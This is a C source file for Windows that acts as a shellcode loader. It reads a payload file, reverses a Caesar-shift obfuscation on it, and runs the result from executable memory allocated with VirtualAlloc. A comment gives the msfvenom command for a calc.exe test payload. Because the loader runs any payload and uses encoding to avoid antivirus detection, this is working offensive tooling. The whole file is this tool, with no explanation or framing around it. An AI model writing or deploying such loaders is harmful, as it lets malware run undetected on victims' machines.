#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

void decode_caesar_cipher(unsigned char *data, size_t length, int shift) {
    for (size_t i = 0; i < length; i++) {
        data[i] = (data[i] - shift) % 256;
    }
}

int main() {
    FILE *file;
    unsigned char *shellcode;
    size_t shellcode_len;
	
	// Kali obfuscation calc.exe example:
	// msfvenom -p windows/exec CMD=calc.exe -f raw -o shellcode-cmd-exe.raw

    // Open the obfuscated shellcode file
    file = fopen("obfuscated_shellcode.raw", "rb");
    if (file == NULL) {
        fprintf(stderr, "Failed to open file\n");
        return 1;
    }

    // Get the size of the shellcode
    fseek(file, 0, SEEK_END);
    shellcode_len = ftell(file);
    fseek(file, 0, SEEK_SET);

    // Allocate memory for the shellcode
    shellcode = (unsigned char*)malloc(shellcode_len);
    if (shellcode == NULL) {
        fprintf(stderr, "Memory allocation failed\n");
        fclose(file);
        return 1;
    }

    // Read the shellcode into memory
    fread(shellcode, 1, shellcode_len, file);
    fclose(file);

    // Decode the shellcode
    decode_caesar_cipher(shellcode, shellcode_len, 33);

    // Allocate executable memory
    void *exec_mem = VirtualAlloc(0, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (exec_mem == NULL) {
        fprintf(stderr, "VirtualAlloc failed with error %lu\n", GetLastError());
        free(shellcode);
        return 1;
    }

    // Copy the decoded shellcode to executable memory
    memcpy(exec_mem, shellcode, shellcode_len);
    free(shellcode);

    // Execute the shellcode
    ((void(*)())exec_mem)();

    // Clean up
    VirtualFree(exec_mem, 0, MEM_RELEASE);
    return 0;
}
